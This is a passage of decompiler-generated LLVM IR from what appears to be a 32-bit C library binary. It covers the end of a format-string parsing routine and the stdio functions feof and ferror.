  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_806cc1f.741 to i32), i32* %ecx.global-to-local, align 4
  %v2_805bce3 = add i32 %tmp76, 32
  %v3_805bce3 = inttoptr i32 %v2_805bce3 to i32*
  store i32 %v0_805bce3, i32* %v3_805bce3, align 4
  %v0_805bce6.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805bcea.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805bce6

dec_label_pc_805bce6:                             ; preds = %dec_label_pc_805bce6, %dec_label_pc_805bcda
  %v0_805bce6 = phi i32 [ %v1_805bce6, %dec_label_pc_805bce6 ], [ %v0_805bce6.pre, %dec_label_pc_805bcda ]
  %v1_805bce6 = add i32 %v0_805bce6, 1
  store i32 %v1_805bce6, i32* %ecx.global-to-local, align 4
  %v1_805bce7 = inttoptr i32 %v1_805bce6 to i8*
  %v2_805bce7 = load i8, i8* %v1_805bce7, align 1
  %v3_805bce7 = sext i8 %v2_805bce7 to i32
  store i32 %v3_805bce7, i32* %eax.global-to-local, align 4
  %v8_805bcec = icmp sgt i32 %v0_805bcea.pre, %v3_805bce7
  br i1 %v8_805bcec, label %dec_label_pc_805bce6, label %dec_label_pc_805bcee

dec_label_pc_805bcee:                             ; preds = %dec_label_pc_805bce6
  store i32 ptrtoint ([21 x i8]* @global_var_806cc29.740 to i32), i32* @ecx, align 4
  %v1_805bcf5 = add i32 %v0_805bce6, -134663199
  store i32 %v1_805bcf5, i32* %eax.global-to-local, align 4
  %v2_805bcfa = add i32 %v0_805bce6, add (i32 ptrtoint (i32* @global_var_806cc10.742 to i32), i32 -134663199)
  %v3_805bcfa = add i32 %v2_805bcfa, %v1_805bcf5
  %v4_805bcfa = inttoptr i32 %v3_805bcfa to i16*
  %v5_805bcfa = load i16, i16* %v4_805bcfa, align 2
  %v6_805bcfa = sext i16 %v5_805bcfa to i32
  store i32 %v6_805bcfa, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_805bcf5, 2
  %v3_805bd02 = add i32 %factor, 134663168
  %v4_805bd02 = inttoptr i32 %v3_805bd02 to i16*
  %v5_805bd02 = load i16, i16* %v4_805bd02, align 2
  %v6_805bd02 = sext i16 %v5_805bd02 to i32
  store i32 %v6_805bd02, i32* %eax.global-to-local, align 4
  %v1_805bd0a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805bd0a = or i32 %v1_805bd0a, %v6_805bcfa
  %v2_805bd0c = and i32 %v2_805bd0a, %v6_805bd02
  store i32 %v2_805bd0c, i32* %edx.global-to-local, align 4
  %v0_805bd1e.pre = load i32, i32* @esi, align 4
  %v0_805bd21.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805bd16

dec_label_pc_805bd10:                             ; preds = %dec_label_pc_805bcc1
  %v1_805bd10 = add i32 %v0_805bd10, 1
  store i32 %v1_805bd10, i32* @ecx, align 4
  %v1_805bd11 = inttoptr i32 %v1_805bd10 to i8*
  %v2_805bd11 = load i8, i8* %v1_805bd11, align 1
  %v3_805bd11 = icmp eq i8 %v2_805bd11, 0
  %v1_805bd14 = icmp eq i1 %v3_805bd11, false
  br i1 %v1_805bd14, label %dec_label_pc_805bcc1, label %dec_label_pc_805bd16

dec_label_pc_805bd16:                             ; preds = %dec_label_pc_805bd10, %dec_label_pc_805bcee
  %v0_805bd21 = phi i32 [ %v0_805bd21.pre, %dec_label_pc_805bcee ], [ %storemerge4, %dec_label_pc_805bd10 ]
  %v0_805bd1e = phi i32 [ %v0_805bd1e.pre, %dec_label_pc_805bcee ], [ %v0_805bcae, %dec_label_pc_805bd10 ]
  %v0_805bd16 = phi i32 [ %v2_805bd0c, %dec_label_pc_805bcee ], [ %v3_805bcbd, %dec_label_pc_805bd10 ]
  store i32 %v0_805bd16, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805bd1e = inttoptr i32 %v0_805bd1e to i8*
  %v2_805bd1e = load i8, i8* %v1_805bd1e, align 1
  %v3_805bd1e = sext i8 %v2_805bd1e to i32
  store i32 %v3_805bd1e, i32* %eax.global-to-local, align 4
  %v2_805bd21 = add i32 %tmp76, 4
  %v3_805bd21 = inttoptr i32 %v2_805bd21 to i32*
  store i32 %v0_805bd21, i32* %v3_805bd21, align 4
  %v0_805bd24 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bd24 = load i32, i32* @edx, align 4
  %v2_805bd24 = add i32 %v1_805bd24, 12
  %v3_805bd24 = inttoptr i32 %v2_805bd24 to i32*
  store i32 %v0_805bd24, i32* %v3_805bd24, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_805bd2b = load i32, i32* @edx, align 4
  %v1_805bd2b = add i32 %v0_805bd2b, 28
  %v2_805bd2b = inttoptr i32 %v1_805bd2b to i32*
  store i32 1, i32* %v2_805bd2b, align 4
  %v0_805bd32 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bd32 = load i32, i32* @edx, align 4
  %v2_805bd32 = add i32 %v1_805bd32, 8
  %v3_805bd32 = inttoptr i32 %v2_805bd32 to i32*
  store i32 %v0_805bd32, i32* %v3_805bd32, align 4
  %v0_805bd35 = load i32, i32* %edi.global-to-local, align 4
  %v1_805bd3f = and i32 %v0_805bd35, -5
  %v0_805bd45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805bd45 = and i32 %v0_805bd45, 3840
  store i32 %v1_805bd45, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805bd4e = or i32 %v1_805bd45, %v1_805bd3f
  store i32 %v2_805bd4e, i32* @edi, align 4
  %v1_805bd50 = load i32, i32* @edx, align 4
  %v2_805bd50 = add i32 %v1_805bd50, 20
  %v3_805bd50 = inttoptr i32 %v2_805bd50 to i32*
  store i32 48, i32* %v3_805bd50, align 4
  %v0_805bd53 = load i32, i32* @edi, align 4
  %v1_805bd53 = load i32, i32* @edx, align 4
  %v2_805bd53 = add i32 %v1_805bd53, 16
  %v3_805bd53 = inttoptr i32 %v2_805bd53 to i32*
  store i32 %v0_805bd53, i32* %v3_805bd53, align 4
  %v0_805bd56 = load i32, i32* @ecx, align 4
  %v1_805bd56 = inttoptr i32 %v0_805bd56 to i8*
  %v2_805bd56 = load i8, i8* %v1_805bd56, align 1
  %v3_805bd56 = icmp eq i8 %v2_805bd56, 0
  %v1_805bd59 = icmp eq i1 %v3_805bd56, false
  br i1 %v1_805bd59, label %dec_label_pc_805bd72, label %dec_label_pc_805bd5b

dec_label_pc_805bd5b:                             ; preds = %dec_label_pc_805bd16
  %v0_805bd5b = load i32, i32* @esi, align 4
  %v1_805bd5b = inttoptr i32 %v0_805bd5b to i8*
  %v2_805bd5b = load i8, i8* %v1_805bd5b, align 1
  %v11_805bd5b = icmp eq i8 %v2_805bd5b, 109
  %v1_805bd5e = icmp eq i1 %v11_805bd5b, false
  br i1 %v1_805bd5e, label %dec_label_pc_805be64, label %dec_label_pc_805bd64

dec_label_pc_805bd64:                             ; preds = %dec_label_pc_805bd5b
  %v0_805bd64 = load i32, i32* @edx, align 4
  %v1_805bd64 = add i32 %v0_805bd64, 32
  %v2_805bd64 = inttoptr i32 %v1_805bd64 to i32*
  store i32 20, i32* %v2_805bd64, align 4
  %v0_805bd6b = load i32, i32* @edx, align 4
  %v1_805bd6b = add i32 %v0_805bd6b, 28
  %v2_805bd6b = inttoptr i32 %v1_805bd6b to i32*
  store i32 0, i32* %v2_805bd6b, align 4
  br label %dec_label_pc_805bd72

dec_label_pc_805bd72:                             ; preds = %dec_label_pc_805bd16, %dec_label_pc_805bd64
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805be06, label %dec_label_pc_805bd7d

dec_label_pc_805bd7d:                             ; preds = %dec_label_pc_805bd72
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_805bdbe = add i32 %tmp76, 40
  %v1_805bdf7 = add i32 %tmp76, 28
  %v2_805bdf7 = inttoptr i32 %v1_805bdf7 to i32*
  %v4_805bd8c = add i32 %tmp76, 36
  br label %dec_label_pc_805bd7f

dec_label_pc_805bd7f:                             ; preds = %dec_label_pc_805bdf2, %dec_label_pc_805bd7d
  %v0_805bd95 = phi i32 [ 0, %dec_label_pc_805bd7d ], [ %v1_805bdf6, %dec_label_pc_805bdf2 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805bd7d ], [ %stack_var_-88.5, %dec_label_pc_805bdf2 ]
  %v1_805bd7f = add i32 %v0_805bd95, -2
  %v6_805bd7f = sub i32 1, %v0_805bd95
  %v7_805bd7f = and i32 %v6_805bd7f, %v0_805bd95
  %v8_805bd7f = icmp slt i32 %v7_805bd7f, 0
  %v9_805bd7f = icmp eq i32 %v1_805bd7f, 0
  %v10_805bd7f = icmp slt i32 %v1_805bd7f, 0
  %v3_805bd82 = icmp eq i1 %v10_805bd7f, %v8_805bd7f
  %v4_805bd82 = icmp eq i1 %v9_805bd7f, false
  %v5_805bd82 = and i1 %v4_805bd82, %v3_805bd82
  br i1 %v5_805bd82, label %dec_label_pc_805bd95, label %dec_label_pc_805bd84

dec_label_pc_805bd84:                             ; preds = %dec_label_pc_805bd7f
  store i32 %tmp76, i32* @edx, align 4
  %v0_805bd88 = load i32, i32* @esp, align 4
  %v2_805bd88 = mul i32 %v0_805bd95, 4
  %v3_805bd88 = add i32 %v2_805bd88, 68
  %v4_805bd88 = add i32 %v3_805bd88, %v0_805bd88
  %v5_805bd88 = inttoptr i32 %v4_805bd88 to i32*
  %v6_805bd88 = load i32, i32* %v5_805bd88, align 4
  store i32 %v6_805bd88, i32* %eax.global-to-local, align 4
  %v1_805bd8c = trunc i32 %v6_805bd88 to i8
  %v5_805bd8c = add i32 %v4_805bd8c, %v0_805bd95
  %v6_805bd8c = inttoptr i32 %v5_805bd8c to i8*
  store i8 %v1_805bd8c, i8* %v6_805bd8c, align 1
  %v0_805bd90 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bd90 = urem i32 %v0_805bd90, 256
  br label %dec_label_pc_805bd9e

dec_label_pc_805bd95:                             ; preds = %dec_label_pc_805bd7f
  %v5_805bd97 = add i32 %v0_805bd95, %stack_var_-32.3
  store i32 %v5_805bd97, i32* %eax.global-to-local, align 4
  %v1_805bd9b = add i32 %v5_805bd97, -2
  br label %dec_label_pc_805bd9e

dec_label_pc_805bd9e:                             ; preds = %dec_label_pc_805bd84, %dec_label_pc_805bd95
  %v0_805bdb1 = phi i32 [ %v1_805bd90, %dec_label_pc_805bd84 ], [ %v1_805bd9b, %dec_label_pc_805bd95 ]
  store i32 %v0_805bdb1, i32* %eax.global-to-local, align 4
  %v5_805bd9e = sub i32 %v0_805bdb1, %stack_var_-88.4
  %v11_805bd9e = xor i32 %v0_805bdb1, %stack_var_-88.4
  %v12_805bd9e = xor i32 %v5_805bd9e, %v0_805bdb1
  %v13_805bd9e = and i32 %v12_805bd9e, %v11_805bd9e
  %v14_805bd9e = icmp slt i32 %v13_805bd9e, 0
  %v15_805bd9e = icmp eq i32 %v5_805bd9e, 0
  %v16_805bd9e = icmp slt i32 %v5_805bd9e, 0
  %v3_805bda2 = icmp ne i1 %v16_805bd9e, %v14_805bd9e
  %v4_805bda2 = or i1 %v15_805bd9e, %v3_805bda2
  br i1 %v4_805bda2, label %dec_label_pc_805bdb1, label %dec_label_pc_805bda4

dec_label_pc_805bda4:                             ; preds = %dec_label_pc_805bd9e
  %v1_805bda4 = add i32 %v0_805bdb1, -9
  %v6_805bda4 = sub i32 8, %v0_805bdb1
  %v7_805bda4 = and i32 %v6_805bda4, %v0_805bdb1
  %v8_805bda4 = icmp slt i32 %v7_805bda4, 0
  %v9_805bda4 = icmp eq i32 %v1_805bda4, 0
  %v10_805bda4 = icmp slt i32 %v1_805bda4, 0
  %v3_805bda7 = icmp eq i1 %v10_805bda4, %v8_805bda4
  %v4_805bda7 = icmp eq i1 %v9_805bda4, false
  %v5_805bda7 = and i1 %v4_805bda7, %v3_805bda7
  br i1 %v5_805bda7, label %dec_label_pc_805be64, label %dec_label_pc_805bdb1

dec_label_pc_805bdb1:                             ; preds = %dec_label_pc_805bda4, %dec_label_pc_805bd9e
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805bd9e ], [ %v0_805bdb1, %dec_label_pc_805bda4 ]
  %v1_805bdb1 = add i32 %v0_805bdb1, -1
  store i32 %v1_805bdb1, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805bdba = load i32, i32* @esp, align 4
  %v1_805bdba = load i32, i32* %ebp.global-to-local, align 4
  %v2_805bdba = mul i32 %v1_805bdba, 4
  %v3_805bdba = add i32 %v0_805bdba, 80
  %v4_805bdba = add i32 %v3_805bdba, %v2_805bdba
  %v5_805bdba = inttoptr i32 %v4_805bdba to i32*
  %v6_805bdba = load i32, i32* %v5_805bdba, align 4
  store i32 %v6_805bdba, i32* %edi.global-to-local, align 4
  %v2_805bdbe = mul i32 %v1_805bdb1, 4
  %v4_805bdbe = add i32 %v3_805bdbe, %v2_805bdbe
  %v5_805bdbe = inttoptr i32 %v4_805bdbe to i32*
  %v6_805bdbe = load i32, i32* %v5_805bdbe, align 4
  store i32 %v6_805bdbe, i32* @eax, align 4
  %v9_805bdc2 = icmp eq i32 %v6_805bdba, 8
  br i1 %v9_805bdc2, label %dec_label_pc_805bdf2, label %dec_label_pc_805bdc7

dec_label_pc_805bdc7:                             ; preds = %dec_label_pc_805bdb1
  %v9_805bdc7 = icmp eq i32 %v6_805bdbe, 8
  br i1 %v9_805bdc7, label %dec_label_pc_805bde2, label %dec_label_pc_805bdcc

dec_label_pc_805bdcc:                             ; preds = %dec_label_pc_805bdc7
  %v12_805bdcc = icmp eq i32 %v6_805bdbe, %v6_805bdba
  br i1 %v12_805bdcc, label %dec_label_pc_805bde2, label %dec_label_pc_805bdd0

dec_label_pc_805bdd0:                             ; preds = %dec_label_pc_805bdcc
  %v1_805bdd0 = call i32 @_promoted_size(i32 %v1_805bdb1)
  store i32 %v1_805bdd0, i32* %ebx.global-to-local, align 4
  %v0_805bdd7 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805bdd7, i32* @eax, align 4
  %v1_805bdd9 = call i32 @_promoted_size(i32 %v1_805bdb1)
  store i32 %v1_805bdd9, i32* %eax.global-to-local, align 4
  %v8_805bde0 = icmp sgt i32 %v1_805bdd0, %v1_805bdd9
  br i1 %v8_805bde0, label %dec_label_pc_805bdf2, label %dec_label_pc_805bdd0.dec_label_pc_805bde2_crit_edge

dec_label_pc_805bdd0.dec_label_pc_805bde2_crit_edge: ; preds = %dec_label_pc_805bdd0
  %v0_805bdea.pre = load i32, i32* @esp, align 4
  %v1_805bdea.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805bde2

dec_label_pc_805bde2:                             ; preds = %dec_label_pc_805bdd0.dec_label_pc_805bde2_crit_edge, %dec_label_pc_805bdcc, %dec_label_pc_805bdc7
  %v1_805bdea = phi i32 [ %v1_805bdea.pre, %dec_label_pc_805bdd0.dec_label_pc_805bde2_crit_edge ], [ %v1_805bdba, %dec_label_pc_805bdcc ], [ %v1_805bdba, %dec_label_pc_805bdc7 ]
  %v0_805bdea = phi i32 [ %v0_805bdea.pre, %dec_label_pc_805bdd0.dec_label_pc_805bde2_crit_edge ], [ %v0_805bdba, %dec_label_pc_805bdcc ], [ %v0_805bdba, %dec_label_pc_805bdc7 ]
  store i32 %v1_805bdb1, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_805bdea = mul i32 %v1_805bdea, 4
  %v3_805bdea = add i32 %v0_805bdea, 80
  %v4_805bdea = add i32 %v3_805bdea, %v2_805bdea
  %v5_805bdea = inttoptr i32 %v4_805bdea to i32*
  %v6_805bdea = load i32, i32* %v5_805bdea, align 4
  store i32 %v6_805bdea, i32* %eax.global-to-local, align 4
  store i32 %v6_805bdea, i32* %v5_805bdbe, align 4
  br label %dec_label_pc_805bdf2

dec_label_pc_805bdf2:                             ; preds = %dec_label_pc_805bdd0, %dec_label_pc_805bdb1, %dec_label_pc_805bde2
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805bdf6 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805bdf6 = add i32 %v0_805bdf6, 1
  store i32 %v1_805bdf6, i32* %ebp.global-to-local, align 4
  %v3_805bdf7 = load i32, i32* %v2_805bdf7, align 4
  %v1_805bdfa = add i32 %v3_805bdf7, 2
  store i32 %v1_805bdfa, i32* %eax.global-to-local, align 4
  %v5_805bdff = icmp slt i32 %v1_805bdf6, %v1_805bdfa
  br i1 %v5_805bdff, label %dec_label_pc_805bd7f, label %dec_label_pc_805be2d

dec_label_pc_805be06:                             ; preds = %dec_label_pc_805bd72
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805be0a = add i32 %tmp76, 38
  %v2_805be0a = inttoptr i32 %v1_805be0a to i8*
  store i8 1, i8* %v2_805be0a, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805be13 = add i32 %tmp76, 28
  %v2_805be13 = inttoptr i32 %v1_805be13 to i32*
  %v3_805be13 = load i32, i32* %v2_805be13, align 4
  %v2_805be16 = mul i32 %v3_805be13, 4
  %v2_805be1a = ptrtoint i32* %stack_var_-20 to i32
  %v1_805be21 = add i32 %tmp76, 40
  store i32 %v1_805be21, i32* %eax.global-to-local, align 4
  %v3_805be25 = inttoptr i32 %v1_805be21 to i16*
  %v4_805be25 = call i32 @memcpy(i16* %v3_805be25, i32 %v2_805be1a, i32 %v2_805be16)
  store i32 %v4_805be25, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805be2d

dec_label_pc_805be2d:                             ; preds = %dec_label_pc_805bdf2, %dec_label_pc_805be06
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805be06 ], [ %stack_var_-88.5, %dec_label_pc_805bdf2 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_805bad8, align 4
  %v0_805be38 = load i32, i32* @ecx, align 4
  %v1_805be38 = add i32 %v0_805be38, 16
  %v2_805be38 = inttoptr i32 %v1_805be38 to i8*
  %v3_805be38 = load i8, i8* %v2_805be38, align 1
  %v5_805be38 = icmp slt i8 %v3_805be38, 0
  br i1 %v5_805be38, label %dec_label_pc_805be45, label %dec_label_pc_805be3e

dec_label_pc_805be3e:                             ; preds = %dec_label_pc_805be2d
  %v0_805be3e = load i32, i32* @esi, align 4
  %v1_805be3e = add i32 %v0_805be3e, 1
  store i32 %v1_805be3e, i32* %eax.global-to-local, align 4
  %v2_805be41 = inttoptr i32 %v0_805be38 to i32*
  store i32 %v1_805be3e, i32* %v2_805be41, align 4
  br label %dec_label_pc_805be58

dec_label_pc_805be45:                             ; preds = %dec_label_pc_805be2d
  store i32 %v4_805baac, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805be4d = load i32, i32* @esi, align 4
  %v2_805be4d = sub i32 %v0_805be4d, %v4_805baac
  store i32 %v2_805be4d, i32* %esi.global-to-local, align 4
  %v1_805be4f = mul i32 %v2_805be4d, 4
  %v2_805be4f = add i32 %v1_805be4f, 224
  store i32 %v2_805be4f, i32* %eax.global-to-local, align 4
  %v2_805be56 = load i32, i32* %arg1, align 4
  %v4_805be56 = add i32 %v2_805be56, %v2_805be4f
  store i32 %v4_805be56, i32* %arg1, align 4
  br label %dec_label_pc_805be58

dec_label_pc_805be58:                             ; preds = %dec_label_pc_805be3e, %dec_label_pc_805be45
  store i32 %tmp76, i32* @edx, align 4
  %v1_805be5c = add i32 %tmp76, 28
  %v2_805be5c = inttoptr i32 %v1_805be5c to i32*
  %v3_805be5c = load i32, i32* %v2_805be5c, align 4
  store i32 %v3_805be5c, i32* %eax.global-to-local, align 4
  %v1_805be5f = add i32 %v3_805be5c, 2
  br label %dec_label_pc_805be67

dec_label_pc_805be64:                             ; preds = %dec_label_pc_805bafd, %dec_label_pc_805bb97, %dec_label_pc_805bbca, %dec_label_pc_805bc45, %dec_label_pc_805bc31, %dec_label_pc_805bc28, %dec_label_pc_805bda4, %dec_label_pc_805bd5b, %dec_label_pc_805bca7
  br label %dec_label_pc_805be67

dec_label_pc_805be67:                             ; preds = %dec_label_pc_805be58, %dec_label_pc_805be64
  %storemerge6 = phi i32 [ -1, %dec_label_pc_805be64 ], [ %v1_805be5f, %dec_label_pc_805be58 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_805be6a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805be6a, i32* @ebx, align 4
  store i32 %v0_805baab, i32* @esi, align 4
  store i32 %v0_805baaa, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_805bdf6, { 0, 2, 1 }
  uselistorder i32 %v1_805bdb1, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805bda4, { 1, 0 }
  uselistorder i32 %v5_805bd9e, { 1, 2, 0 }
  uselistorder i32 %v0_805bdb1, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_805bd7f, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_805bd95, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_805bd10, { 1, 2, 0 }
  uselistorder i32 %v1_805bce6, { 1, 2, 0 }
  uselistorder i32 %v0_805bd10, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805bcab, { 1, 0 }
  uselistorder i32 %v1_805bc9a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805bca3, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_805bc8d, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805bc83, { 1, 0 }
  uselistorder i32 %v1_805bc65, { 1, 0 }
  uselistorder i32 %v0_805bc83.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_805bc48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805bc3f, { 1, 2, 0 }
  uselistorder i32 %v0_805bc05, { 1, 0 }
  uselistorder i32 %v1_805bbf7, { 1, 0 }
  uselistorder i32 %v1_805bbf2, { 0, 1, 3, 2 }
  uselistorder i32 %v6_805bbf0, { 2, 0, 1 }
  uselistorder i32 %v0_805bc12, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_805bbad, { 1, 2, 0 }
  uselistorder i32 %v0_805bb85, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_805bb7b, { 1, 2, 0 }
  uselistorder i32 %v6_805bb79, { 0, 2, 1 }
  uselistorder i32 %v0_805bb78, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_805bb71, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_805bb71, { 2, 1, 0 }
  uselistorder i32 %v1_805bb69, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_805bb54, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_805bb4f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_805bb25, { 0, 2, 1 }
  uselistorder i32 %v0_805bb12, { 2, 0, 1 }
  uselistorder i32 %v4_805baac, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 34, 30, 29, 31, 32, 35, 33, 41, 36, 37, 38, 39, 40, 42, 43 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 3840, { 4, 5, 6, 2, 3, 0, 1 }
  uselistorder i32 -5, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -134663199, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_806cc29.740 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805be67, { 1, 0 }
  uselistorder label %dec_label_pc_805be64, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_805be58, { 1, 0 }
  uselistorder label %dec_label_pc_805be2d, { 1, 0 }
  uselistorder label %dec_label_pc_805bdf2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805bd9e, { 1, 0 }
  uselistorder label %dec_label_pc_805bd72, { 1, 0 }
  uselistorder label %dec_label_pc_805bcda, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805bca7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805bc7e, { 1, 0 }
  uselistorder label %dec_label_pc_805bc55, { 1, 0 }
  uselistorder label %dec_label_pc_805bc1c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805bbbf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805bb79, { 1, 0 }
  uselistorder label %dec_label_pc_805bb78, { 1, 0 }
  uselistorder label %dec_label_pc_805bb5f, { 1, 0 }
  uselistorder label %dec_label_pc_805bb48, { 1, 0 }
  uselistorder label %dec_label_pc_805bb48.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_805be70 = load i32, i32* @edi, align 4
  %v0_805be71 = load i32, i32* @esi, align 4
  %v0_805be72 = load i32, i32* @ebx, align 4
  store i32 %tmp5, i32* @esi, align 4
  %v1_805be7a = add i32 %tmp5, 52
  %v2_805be7a = inttoptr i32 %v1_805be7a to i32*
  %v3_805be7a = load i32, i32* %v2_805be7a, align 4
  store i32 %v3_805be7a, i32* @edi, align 4
  %v1_805be7d = icmp eq i32 %v3_805be7a, 0
  %v1_805be7f = icmp eq i1 %v1_805be7d, false
  br i1 %v1_805be7f, label %dec_label_pc_805bea0.thread, label %dec_label_pc_805bea6

dec_label_pc_805bea0.thread:                      ; preds = %entry
  br label %dec_label_pc_805beb7

dec_label_pc_805bea6:                             ; preds = %entry
  %v1_805be81 = add i32 %tmp5, 56
  store i32 %v1_805be81, i32* @ebx, align 4
  %v4_805be90 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805be81)
  %v0_805be95 = load i32, i32* @ebx, align 4
  %v1_805be98 = call i32 @pthread_mutex_lock(i32 %v0_805be95)
  %v0_805bea0.pre = load i32, i32* @esi, align 4
  %v1_805bea0 = inttoptr i32 %v0_805bea0.pre to i32*
  %v2_805bea0 = load i32, i32* %v1_805bea0, align 4
  store i32 %v2_805bea0, i32* @ebx, align 4
  %v3_805beaf = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_805beb7

dec_label_pc_805beb7:                             ; preds = %dec_label_pc_805bea0.thread, %dec_label_pc_805bea6
  %v0_805beb7.in = phi i32* [ @ebx, %dec_label_pc_805bea6 ], [ %arg1, %dec_label_pc_805bea0.thread ]
  %v0_805beb7 = load i32, i32* %v0_805beb7.in, align 4
  %v1_805bebc = and i32 %v0_805beb7, 4
  store i32 %v0_805be72, i32* @ebx, align 4
  store i32 %v0_805be71, i32* @esi, align 4
  store i32 %v0_805be70, i32* @edi, align 4
  ret i32 %v1_805bebc

; uselistorder directives
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805beb7, { 1, 0 }
}

define i32 @ferror(i32* %arg1) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_805bec4 = load i32, i32* @edi, align 4
  %v0_805bec5 = load i32, i32* @esi, align 4
  %v0_805bec6 = load i32, i32* @ebx, align 4
  store i32 %tmp5, i32* @esi, align 4
  %v1_805bece = add i32 %tmp5, 52
  %v2_805bece = inttoptr i32 %v1_805bece to i32*
  %v3_805bece = load i32, i32* %v2_805bece, align 4
  store i32 %v3_805bece, i32* @edi, align 4
  %v1_805bed1 = icmp eq i32 %v3_805bece, 0
  %v1_805bed3 = icmp eq i1 %v1_805bed1, false
  br i1 %v1_805bed3, label %dec_label_pc_805bef4.thread, label %dec_label_pc_805befa

dec_label_pc_805bef4.thread:                      ; preds = %entry
  br label %dec_label_pc_805bf0b

dec_label_pc_805befa:                             ; preds = %entry
  %v1_805bed5 = add i32 %tmp5, 56
  store i32 %v1_805bed5, i32* @ebx, align 4
